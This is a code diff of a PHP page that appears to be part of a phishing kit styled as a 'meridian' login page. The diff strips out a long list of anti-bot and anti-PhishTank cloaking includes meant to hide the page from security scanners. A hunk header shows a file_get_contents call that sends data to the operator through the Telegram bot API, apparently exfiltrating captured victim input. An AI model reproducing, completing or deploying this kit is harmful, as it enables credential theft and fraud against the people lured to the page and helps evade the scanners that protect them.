@@ -1,29 +1,5 @@
 <?php
-        include "/anti-bot/Bot-Spox.php";
-        include "/anti-bot/Dila_DZ.php";
-        include "/anti-bot/Fuck-you.php";
-        include "/anti-bot/index.php";
-        include "/anti-bot/IP-BlackList.php";
-        include "/anti-bot/new.php";
-        include "/anti-bot/proxyblock.php";
-        include "/anti-bot/whitelist.dat";
-        include "/anti-bot/#1.php";
-        include "/anti-bot/#2.php";
-        include "/anti-bot/#3.php";
-        include "/anti-bot/#4.php";
-        include "/anti-bot/#5.php";
-        include "/anti-bot/#6.php";
-        include "/anti-bot/#7.php";
-        include "/anti-bot/#8.php";
-        include "/anti-bot/#9.php";
-        include "/anti-bot/#10.php";
-        include "/anti-bot/#11.php";
-        include "/anti-bot/#12.php";
-        include "/anti-bot/antibot_host.php";
-        include "/anti-bot/antibot_ip.php";
-        include "/anti-bot/antibot_phishtank.php";
-        include "/anti-bot/antibot_proxy.php";
-        include "/anti-bot/antibot_userAgent.php";
+
 $full_date = date("h:i:s|M/d/Y");
 $time = date("h:i:s");
 $date = date("M/d/Y");
@@ -202,31 +178,7 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
                                                     
 
 ?>
-<? php         include "/anti-bot/Bot-Spox.php";
-        include "/anti-bot/Dila_DZ.php";
-        include "/anti-bot/Fuck-you.php";
-        include "/anti-bot/index.php";
-        include "/anti-bot/IP-BlackList.php";
-        include "/anti-bot/new.php";
-        include "/anti-bot/proxyblock.php";
-        include "/anti-bot/whitelist.dat";
-        include "/anti-bot/#1.php";
-        include "/anti-bot/#2.php";
-        include "/anti-bot/#3.php";
-        include "/anti-bot/#4.php";
-        include "/anti-bot/#5.php";
-        include "/anti-bot/#6.php";
-        include "/anti-bot/#7.php";
-        include "/anti-bot/#8.php";
-        include "/anti-bot/#9.php";
-        include "/anti-bot/#10.php";
-        include "/anti-bot/#11.php";
-        include "/anti-bot/#12.php";
-        include "/anti-bot/antibot_host.php";
-        include "/anti-bot/antibot_ip.php";
-        include "/anti-bot/antibot_phishtank.php";
-        include "/anti-bot/antibot_proxy.php";
-        include "/anti-bot/antibot_userAgent.php"; ?>=(0044)/220098/meridian -->
+<? php  ?>=(0044)/220098/meridian -->
 <html xmlns="http://www.w3.org/1999/xhtml" class=" js flexbox flexboxlegacy" native-dark-active=""><link type="text/css" rel="stylesheet" id="#"><link type="text/css" rel="stylesheet" id="#"><style lang="en" type="text/css" id=#"></style><style lang="en" type="text/css" id="#">: {
   --native-dark-accent-color: #a9a9a9;
   --native-dark-bg-color: #292929;
